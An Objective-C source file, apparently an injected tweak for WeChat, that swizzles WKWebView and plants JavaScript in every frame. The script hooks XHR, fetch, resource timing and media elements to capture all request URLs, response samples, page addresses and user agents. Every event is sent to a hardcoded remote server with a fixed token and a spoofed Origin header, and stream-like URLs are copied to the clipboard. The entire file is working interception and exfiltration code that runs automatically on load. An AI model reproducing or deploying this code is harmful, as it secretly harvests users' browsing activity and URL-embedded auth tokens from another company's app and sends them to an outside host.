// ALIWeChatWKSniffer_Reinject.m
// 关键改动：
// 1) swizzle WKWebView 的 setNavigationDelegate:，注入代理，导航完成后自动 evaluate 注入脚本
// 2) swizzle initWithFrame:configuration:，对“之后创建的 WKWebView”直接塞入 WKUserScript(documentStart, forMainFrameOnly:NO) + message handler
// 3) JS 内部增加 SPA 重注入（history.pushState/replaceState/popstate）
// 4) 仍然把所有事件原样 JSON 上报；命中疑似流地址本地弹窗+复制

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <objc/runtime.h>

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }

static const NSTimeInterval kFirstDelay     = 1.2;
static const NSTimeInterval kScanInterval   = 1.5;
static const NSTimeInterval kDedupeWindow   = 60.0;
static const BOOL kShowPopupOnInject        = YES;
static const BOOL kShowPopupOnHit           = YES;

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[ALI-WX] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

#pragma mark - 工具 & 状态

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;

static inline void on_main(void(^blk)(void)){
    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}

static UIWindow *keyWin(void){
    UIWindow *win = nil;
    if (@available(iOS 13.0,*)) {
        for (UIScene *s in UIApplication.sharedApplication.connectedScenes){
            if (![s isKindOfClass:[UIWindowScene class]]) continue;
            UIWindowScene *sc = (UIWindowScene*)s;
            if (sc.activationState==UISceneActivationStateForegroundActive){
                for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win=w; break; }
                if (win) break;
            }
        }
    }
    if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
    return win;
}

static void popup(NSString *title, NSString *msg, NSString *copyText){
    on_main(^{
        @try{
            UIWindow *w = keyWin(); if (!w) return;
            UIViewController *vc = w.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyText.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}

static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@"phonelive"]||[s containsString:@"vzan"]||[s containsString:@"weizan"]||
        [s containsString:@"pull."]||[s containsString:@"replay"]||[s containsString:@"live"]) return YES;
    if ([s containsString:@"auth_key="]||[s containsString:@"txsecret"]||[s containsString:@"txkey"]||
        [s containsString:@"token="]||[s containsString:@"sign="]||[s containsString:@"auth="]) return YES;
    return NO;
}

static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u], *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

static void postText(NSString *text){
    if (!text) return;
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count) return;
        NSString *url = [kPushHost stringByAppendingString:paths[idx++]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (e || sc<200 || sc>=300) tryNext();
        }] resume];
    }; tryNext();
}

static NSString *jsonStringify(NSDictionary *obj){
    if (!obj) return nil;
    NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
}

static void handleRawEvent(NSDictionary *evt){
    NSString *js = jsonStringify(evt);
    if (js) postText(js);

    NSString *u = evt[@"url"];
    if (u && looksLikeStream(u) && !dedupe_skip(u)) {
        if (kShowPopupOnHit){
            UIPasteboard.generalPasteboard.string = u;
            NSString *from = evt[@"from"] ?: evt[@"type"] ?: @"inpage";
            popup(@"抓到URL", [NSString stringWithFormat:@"%@\n%@", from, u], u);
        }
    }
}

#pragma mark - JS（带 SPA 监听 + 全量采集）

static NSString *inpageJS(void){
    return @
    "(function(){try{"
      "function send(t,data){try{var p=data||{};p.type=t;p.ts=Date.now();p.page=location.href;p.ua=navigator.userAgent;"
        "if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){window.webkit.messageHandlers.__ALI_SNIF__.postMessage(p);}else{console.log('[ALI_SNIF]',p);window.__ALI_SNIF_LAST__=p;}}catch(e){}}"
      "function looks(u){if(!u)return false;u=(u+'').toLowerCase();"
        "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.ts')!=-1||u.indexOf('.mp4')!=-1) return true;"
        "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1) return true;"
        "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('pull.')!=-1||u.indexOf('replay')!=-1||u.indexOf('live')!=-1) return true;return false;}"
      "if(!window.__ALI_SNIF_BOOT__){"
        "window.__ALI_SNIF_BOOT__=function(){try{"
          "send('INJECT_OK',{});"
          // XHR
          "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
            "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
            "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
              "var onload=function(){try{var ct=(self.getResponseHeader?self.getResponseHeader('Content-Type'):'')||'';var st=(self.status||0);var sample=null;"
                "if(ct.toLowerCase().indexOf('mpegurl')!=-1&&self.responseText){sample=self.responseText.slice(0,256);}else if(self.responseText&&self.responseText.indexOf('#EXTM3U')!=-1){sample=self.responseText.slice(0,256);ct=ct||'application/vnd.apple.mpegurl';}"
                "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample});if(looks(u))send('HIT',{from:'xhr',url:u});}catch(e){}};"
              "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
          "})();"
          // fetch
          "(function(){if(!window.fetch||window.fetch.__ali_patched__)return;var F=window.fetch;window.fetch.__ali_patched__=true;"
            "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u){send('FETCH_REQ',{from:'fetch',url:u,method:m});}"
              "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();"
                "if(c&&c.text){c.text().then(function(t){var sample=null;if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256);if(!ct)ct='application/vnd.apple.mpegurl';}"
                  "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
                "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}if(looks(u))send('HIT',{from:'fetch',url:u});}catch(e){}return r;});}"
            "catch(e){return F.apply(this,arguments)}})();"
          // resource observer
          "(function(){if(!('PerformanceObserver'in window) || window.__ali_perf__)return;window.__ali_perf__=true;"
            "try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''});if(looks(u))send('HIT',{from:'perf',url:u});}}catch(e){}});"
            "ob.observe({type:'resource',buffered:true});}catch(e){}})();"
          // media
          "(function(){if(window.__ali_media__)return;window.__ali_media__=true;"
            "function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s});if(looks(s))send('HIT',{from:tag,url:s});}}catch(e){}}"
            "var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];"
              "if(n&&n.tagName){var t=n.tagName.toLowerCase();if(t==='video'||t==='audio'){report(n,t,'add');n.addEventListener&&n.addEventListener('play',function(){report(this,t,'play')},false);} }"
              "if(n&&n.querySelectorAll){var vs=n.querySelectorAll('video,audio');for(var j=0;j<vs.length;j++){var t2=vs[j].tagName.toLowerCase();report(vs[j],t2,'sub');vs[j].addEventListener&&vs[j].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} }}}});});"
            "obs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
            "var vs=document.querySelectorAll&&document.querySelectorAll('video,audio');for(var k=0;k<(vs?vs.length:0);k++){var t=vs[k].tagName.toLowerCase();report(vs[k],t,'init');vs[k].addEventListener&&vs[k].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} "
            "var setA=Element.prototype.setAttribute;if(!Element.prototype.__ali_setattr__){Element.prototype.__ali_setattr__=true;Element.prototype.setAttribute=function(k,v){try{if(this.tagName){var t=this.tagName.toLowerCase();if((t==='video'||t==='audio')&&k&&k.toLowerCase()==='src'){send('MEDIA_SET',{from:'setAttr',url:v});if(looks(v))send('HIT',{from:'setAttr',url:v});}}}catch(e){}return setA.apply(this,arguments)};}"
          "})();"
        "}catch(e){console.log('boot error',e)}};"
      "}"
      // 首次立即 boot；并监听 SPA 路由变化
      "window.__ALI_SNIF_BOOT__();"
      "(function(){if(window.__ali_spa__)return;window.__ali_spa__=true;"
        "var _ps=history.pushState,_rs=history.replaceState;history.pushState=function(){try{var r=_ps.apply(this,arguments);setTimeout(window.__ALI_SNIF_BOOT__,0);return r;}catch(e){return _ps.apply(this,arguments)}};"
        "history.replaceState=function(){try{var r=_rs.apply(this,arguments);setTimeout(window.__ALI_SNIF_BOOT__,0);return r;}catch(e){return _rs.apply(this,arguments)}};"
        "window.addEventListener('popstate',function(){setTimeout(window.__ALI_SNIF_BOOT__,0)},false);"
        "document.addEventListener('readystatechange',function(){if(document.readyState==='complete'){setTimeout(window.__ALI_SNIF_BOOT__,0)}},false);"
      "})();"
      "console.log('[ALI_SNIF] injected (reinjection enabled)');"
    "}catch(e){console.log('[ALI_SNIF] inject error',e)}})();";
}

#pragma mark - Message handler

@interface ALIMessageHandler : NSObject <WKScriptMessageHandler>
@end
@implementation ALIMessageHandler
- (void)userContentController:(WKUserContentController *)userContentController
      didReceiveScriptMessage:(WKScriptMessage *)message {
    if (![message.body isKindOfClass:[NSDictionary class]]) return;
    handleRawEvent((NSDictionary *)message.body);
}
@end

static ALIMessageHandler *g_handler;

#pragma mark - WKWebView 代理包装（转发原 delegate）

@interface ALIProxyNav : NSObject <WKNavigationDelegate>
@property (nonatomic, weak) id<WKNavigationDelegate> real;
@property (nonatomic, weak) WKWebView *webView;
@end

@implementation ALIProxyNav
- (BOOL)respondsToSelector:(SEL)aSelector {
    if ([super respondsToSelector:aSelector]) return YES;
    return [self.real respondsToSelector:aSelector];
}
- (id)forwardingTargetForSelector:(SEL)aSelector { return self.real; }

// 注入时机 1：允许导航前也可先下发轻量脚本（防早期丢失）
- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler {
    NSString *js = inpageJS();
    [webView evaluateJavaScript:js completionHandler:nil];
    if ([self.real respondsToSelector:_cmd]) {
        [(id)self.real webView:webView decidePolicyForNavigationAction:navigationAction decisionHandler:decisionHandler];
    } else {
        decisionHandler(WKNavigationActionPolicyAllow);
    }
}

// 注入时机 2：页面加载完成后再注入一次（稳）
- (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation {
    NSString *js = inpageJS();
    [webView evaluateJavaScript:js completionHandler:nil];
    if ([self.real respondsToSelector:_cmd]) {
        [(id)self.real webView:webView didFinishNavigation:navigation];
    }
}
@end

#pragma mark - Swizzle

static const void *kProxyKey = &kProxyKey;
static const void *kInjectedKey = &kInjectedKey;

static void ali_swizzle(Class cls, SEL sel, IMP imp, const char *types){
    Method m = class_getInstanceMethod(cls, sel);
    if (m){
        IMP old = method_setImplementation(m, imp);
        (void)old;
    }else{
        class_addMethod(cls, sel, imp, types);
    }
}

// setNavigationDelegate:
static void (*orig_setNavDelegate)(id, SEL, id);
static void ali_setNavDelegate(id self, SEL _cmd, id delegate){
    // 包一层代理，转发给原 delegate
    id proxy = objc_getAssociatedObject(self, kProxyKey);
    if (!proxy){
        proxy = [ALIProxyNav new];
        objc_setAssociatedObject(self, kProxyKey, proxy, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    }
    [(ALIProxyNav*)proxy setReal:delegate];
    [(ALIProxyNav*)proxy setWebView:self];
    orig_setNavDelegate(self, _cmd, proxy);
}

// initWithFrame:configuration:
static id (*orig_initFrameConf)(id, SEL, CGRect, WKWebViewConfiguration *);
static id ali_initFrameConf(id self, SEL _cmd, CGRect frame, WKWebViewConfiguration *conf){
    id ret = orig_initFrameConf(self, _cmd, frame, conf);
    @try{
        if (!g_handler) g_handler = [ALIMessageHandler new];
        // 放一个 documentStart 的 user script，forMainFrameOnly:NO 覆盖所有 frame
        WKUserContentController *ucc = conf.userContentController;
        BOOL needHandler = YES;
        for (WKUserScript *s in ucc.userScripts){ if ([s.source containsString:@"__ALI_SNIF_BOOT__"]){ needHandler = NO; break; } }
        if (needHandler){
            NSString *src = inpageJS();
            WKUserScript *us = [[WKUserScript alloc] initWithSource:src injectionTime:WKUserScriptInjectionTimeAtDocumentStart forMainFrameOnly:NO];
            [ucc addUserScript:us];
            @try{ [ucc addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}
        }
    }@catch(__unused NSException *e){}
    return ret;
}

#pragma mark - 扫描（兜底：对已存在 WKWebView evaluate）

static void inject_into_existing(WKWebView *wv){
    if (!wv) return;
    NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
    if (flag.boolValue) return;
    objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);

    if (!g_handler) g_handler = [ALIMessageHandler new];
    @try{ [wv.configuration.userContentController addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}
    NSString *js = inpageJS();
    [wv evaluateJavaScript:js completionHandler:nil];
}

static void walk_view(UIView *v){
    if (!v) return;
    Class WK = NSClassFromString(@"WKWebView");
    if (WK && [v isKindOfClass:WK]) inject_into_existing((WKWebView*)v);
    for (UIView *sub in v.subviews) walk_view(sub);
}

static void scan_loop(void){
    on_main(^{
        @try{
            for (UIWindow *w in UIApplication.sharedApplication.windows) walk_view(w);
        }@catch(__unused NSException *e){}
    });
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
}

#pragma mark - 入口

__attribute__((constructor))
static void ALIWeChatWKSnifferReinjectInit(void){
    if (!gq)    gq    = dispatch_queue_create("com.aliwechat.wksniffer.reinject", DISPATCH_QUEUE_SERIAL);
    if (!g_seen)g_seen= [NSMutableDictionary dictionary];

    on_main(^{
        // swizzle setNavigationDelegate:
        Class WK = NSClassFromString(@"WKWebView");
        if (WK){
            SEL setNavSel = @selector(setNavigationDelegate:);
            Method m = class_getInstanceMethod(WK, setNavSel);
            if (m){
                orig_setNavDelegate = (void*)method_getImplementation(m);
                ali_swizzle(WK, setNavSel, (IMP)ali_setNavDelegate, method_getTypeEncoding(m));
            }
            // swizzle initWithFrame:configuration:
            SEL initSel = @selector(initWithFrame:configuration:);
            Method m2 = class_getInstanceMethod(WK, initSel);
            if (m2){
                orig_initFrameConf = (void*)method_getImplementation(m2);
                ali_swizzle(WK, initSel, (IMP)ali_initFrameConf, method_getTypeEncoding(m2));
            }
        }

        // 首次提示
        if (kShowPopupOnInject){
            popup(@"JS 注入通道建立", @"将自动在每次页面导航完成后重注入，并覆盖子 frame。", nil);
            NSDictionary *evt = @{@"type": @"NATIVE_INJECT_READY",
                                  @"app": @"WeChat",
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s = jsonStringify(evt);
            if (s) postText(s);
        }

        // 对当前已存在的 WKWebView 先 evaluate 一次（兜底）
        scan_loop();
    });
}
